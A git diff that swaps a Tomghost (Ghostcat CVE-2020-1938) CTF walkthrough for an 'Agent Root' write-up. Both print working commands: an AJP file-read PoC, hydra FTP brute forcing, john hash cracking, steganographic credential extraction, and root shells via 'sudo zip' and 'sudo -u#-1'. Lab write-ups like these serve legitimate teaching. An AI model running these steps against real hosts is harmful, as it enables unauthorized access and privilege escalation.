@@ -1,169 +1,90 @@
----
-description: >-
-  Recon → Ghostcat file read via AJP → SSH foothold → GPG pivot → sudo zip to
-  root.
-metaLinks:
-  alternates:
-    - https://app.gitbook.com/s/JbMs2bD1gcL5F6LMRlXh/
----
+CTF Writeup: Agent Root
 
-# Tomghost — Ghostcat (CVE-2020-1938) Walkthrough
+Target IP: 10.64.132.208
+1. Information Gathering & Port Scanning
 
-### Scope
+An initial port scan was conducted to identify open services and versions:
+Port	State	Service	Version
+21/tcp	open	
 
-Target: `10.65.179.38`&#x20;
+FTP
+	
 
-Author: Oussama Zehri
+vsftpd 3.0.3 
 
-Machine link :[https://tryhackme.com/room/tomghost](https://tryhackme.com/room/tomghost)
+22/tcp	open	SSH	
 
-Goal: get an initial shell, pivot if needed, then escalate to `root`.
+OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 
 
-{% hint style="warning" %}
-Use these steps only in authorized labs (TryHackMe/HTB/etc).
-{% endhint %}
+80/tcp	open	HTTP	
 
-***
+Apache httpd 2.4.29 
 
-### Recon
+2. Web Enumeration
 
-Run a full port and service scan:
+Directory discovery using gobuster with multiple wordlists yielded no results. However, a manual inspection of the page content revealed a clue: "from agent R".
 
-```bash
-nmap -sC -sV -p- 10.65.179.38
-```
+User-Agent Fuzzing
 
-Key findings from the scan:
+I hypothesized that the server provides different content based on the User-Agent. Using curl -L to follow redirects and fuzzing the User-Agent header, I discovered that using "C" as the User-Agent revealed a secret message:
 
-* `22/tcp` SSH (OpenSSH 7.2p2 Ubuntu)
-* `8009/tcp` AJP/1.3 (Tomcat connector)
-* `8080/tcp` HTTP (Apache Tomcat **9.0.30**)
+    "Attention chris, Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! From, Agent R" 
 
-That combo (`8080` + `8009`) is a strong Ghostcat signal.
+This confirmed the target username is chris.
 
-***
+3. Exploitation (FTP Brute Force)
 
-### Web enumeration (8080)
+Since the web message mentioned a weak password, I performed a brute-force attack against the FTP service using hydra and the rockyou.txt wordlist:
+Bash
 
-Directory brute force:
+hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.64.132.208 ftp
 
-```bash
-gobuster dir -u http://10.65.179.38:8080/ -w /usr/share/wordlists/dirb/common.txt
-```
+I successfully retrieved the password and logged in to download the available files:
 
-Interesting endpoint:
+Bash
 
-* `/manager` (Tomcat Manager)
+mget *
 
-If you can access the manager page, keep any discovered creds handy. Even if they don’t work there, they often work for SSH.
+4. Steganography & Data Extraction
 
-***
+Among the downloaded files was a note from Agent C to Agent J stating that the "alien-like photos" were fake and a login password was hidden inside a "fake picture".
 
-### Vulnerability: Ghostcat (CVE-2020-1938)
+Extracting the Hidden ZIP
 
-Tomcat 9.0.30 is in the vulnerable range for Ghostcat.
+Using binwalk, I identified and extracted a hidden ZIP file from one of the images:
 
-The bug sits in AJP (port `8009`). In the common misconfig case, it can allow unauthenticated file reads.
+Bash
 
-Typical high-value target:
+binwalk -e <picture_name>
 
-* `WEB-INF/web.xml` (often contains app usernames/passwords or secrets)
+The ZIP was encrypted. I converted it to a hash format and cracked it using john the ripper:
 
-{% hint style="info" %}
-Ghostcat is primarily **file read / file include**. It can become RCE if you can get a server-side file written and executed.
-{% endhint %}
+Bash
 
-***
+zip2john 8702.zip > zip_name.hash
+john zip_name.hash --wordlist=/usr/share/wordlists/rockyou.txt
 
-### Foothold: read `web.xml` via AJP (8009)
+Decoding the Passphrase
 
-Grab a public PoC (one common Searchsploit entry is `48143.py`), then read `web.xml`:
+After unzipping the file with 7z, I found a .txt file containing a Base64 encoded string. Decoding this provided a passphrase.
 
-```bash
-# Example syntax used by common Ghostcat PoCs
-python2 48143.py -p 8009 -f WEB-INF/web.xml 10.65.179.38
-```
+Extracting SSH Credentials
 
-From the output, extract credentials you can reuse (often basic-auth style or app creds).
+Using the decoded passphrase, I used steghide to extract hidden data from another image:
 
-Then try SSH with the discovered username/password:
+Bash
 
-```bash
-ssh <user>@10.65.179.38
-```
+steghide extract -sf <picture_name>.jpg
 
-At this point you should have initial access.
+This revealed a new username and SSH password.
 
-***
+5. Initial Access & Privilege Escalation
 
-### Post-exploitation: pivot material (GPG + key)
+I established an SSH connection and began local enumeration. Checking the sudo version and permissions, I identified a known bypass vulnerability.
 
-If you don’t see the expected flags in the first home directory, enumerate for “interesting” files:
+Exploit:
+Bash
 
-```bash
-ls -la
-find /home -maxdepth 3 -type f -iname "*.asc" -o -iname "*.pgp" 2>/dev/null
-```
+sudo -u#-1 /bin/bash
 
-In this box, you typically find:
-
-* `tryhackme.asc` (an exported private key)
-* `credential.pgp` (an encrypted blob)
-
-#### Crack the key passphrase (John)
-
-Convert and crack:
-
-```bash
-gpg2john tryhackme.asc > hash.txt
-john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
-```
-
-#### Import the key and decrypt the PGP
-
-```bash
-gpg --import tryhackme.asc
-gpg --decrypt credential.pgp
-```
-
-You should get credentials for another user (commonly `merlin:<password>`).
-
-Switch user:
-
-```bash
-su - merlin
-```
-
-***
-
-### Privilege escalation: `zip` via sudo (GTFOBins)
-
-Check sudo rights:
-
-```bash
-sudo -l
-```
-
-If `zip` is allowed as root, you can pop a root shell using the GTFOBins technique:
-
-```bash
-sudo zip /tmp/test.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"
-```
-
-Validate:
-
-```bash
-id
-whoami
-root
-```
-
-***
-
-### Notes / troubleshooting
-
-* If the Ghostcat PoC returns nothing, verify:
-  * port `8009` is reachable from your host
-  * the AJP connector isn’t protected with `secretRequired="true"`
-* If `/manager` prompts for auth, don’t brute force it blindly. Extract creds from `web.xml` first.
-* If `su` is blocked, try SSHing directly as the second user.
+This command granted root access immediately. The final flag was located at /root/root.txt.
